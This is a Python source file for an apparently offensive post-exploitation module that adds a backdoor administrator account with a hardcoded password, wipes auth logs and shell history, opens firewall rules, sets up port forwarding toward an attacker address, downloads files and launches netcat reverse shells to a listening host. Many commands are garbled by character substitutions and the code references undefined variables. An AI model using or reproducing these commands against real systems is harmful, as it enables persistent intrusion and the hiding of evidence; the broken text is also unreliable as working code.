
import os
import platform

from Session import Session

class Maintain:
    def __init__(self):
        self._maintainDictionary = { -1 : 'Netcat',
                                      1 : 'Listen on port X',
                                      2 : 'Netcat Reverse Shell'}

    def getMaintainDictionary(self):
        return self._maintainDictionary

    def standardOP(self):
        if platform.system() == 'Windows':
            pass
        else:
            session.runCmdSimple('unset HISTFILE')

    def addUser(self):
        if platform.system() == 'Windows':
            session.runCmdSimple('net user /add bind wallappleblue', 'Adding new user')
            session.runCmdSimple('new localgroup administrators bind /add')    # Add to admin group
        else:
            session.runCmdSimple('useradd -p wallappleblue bind', 'Adding new user')
            session.runCmdSimple('usermod -aG sudo bind')                      # Add to sudo group

            print('Try: ssh bind@localhost to test if ssh is available already')

        print('Test user and see if it\'s created.')

    def installRat(self):
        return

    def coverYourTracks(self):
        if platform.system() == 'Windows':
            pass
        else:
            session.runCmdSimple('echo "" /var/log/auth.log')       # Clear auth.log file
            session.runCmdSimple('echo "" -/.bash history')         # Clear current user bash history
            session.runCmdSimple('rrn -/.bash histor/ -rf')         # Delete .bash_history file
            session.runCmdSimple('history -c')                      # Clear current session history
            session.runCmdSimple('export HISTFILESIZE=O')           # Set history max lines to 0
            session.runCmdSimple('export HISTSIZE=O')               # Set histroy max commands to 0
            session.runCmdSimple('unset HISTFILE')                  # Disable history logging (need to logout to take effect)
            session.runCmdSimple('kill -9 $$')                      # Kills current session
            session.runCmdSimple('ln /dev/null -/.bash_historj -sf')# Perrnanently send all bash history to null

    def allowSSH(self):
        if platform.system() == 'Windows':
            print('NOT DONE')
        else:
            print('ALLOW SSH ON PORT 22 OUTBOUND')
            session.runCmdSimple('iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT')
            session.runCmdSimple('iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT')

    def portForward(self):
        if platform.system() == 'Windows':
            print('NOT DONE')
        else:
            session.runCmdSimple('echo "1" /proc/sjs/net/lpv4/lp forward')
            #session.runCmdSimple('iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport 443 -to-destination attk 1p :443')
            #session.runCmdSimple('iptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s target subnet cidr -d attackip --dport 443 -to-source pivotip')
            #session.runCmdSimple('iptables -t filter -I FORWARD 1 -j ACCEPT')

    def downloadFile(self, url):
        if platform.system() == 'Windows':
            session.runCmdSimple('(new-object sjstem.net.webclient).downloadFile("' + url + '", "./")', 'Downloading file')
        else:
            session.runCmdSimple('wget ' + url + './', 'Downloading file')

    def runNetcat(self, index, port = '80'):
        if index == 1:
            session.runThreadedCmd('nc -nvlp ' + port, 'Netcat listening')
        elif index == 2:
            print('Enter listening host: ' + session.getRemoteHost())
            if os.system() == 'Windows':
                session.runThreadedCmd('nc -e cmd.exe ' + listeningHost + ' ' + port, 'Netcat Reverse Shell')
            else:
                session.runThreadedCmd('nc -e /bin/sh ' + listeningHost + ' ' + port, 'Netcat Reverse Shell')
        else:
            print('Try again')

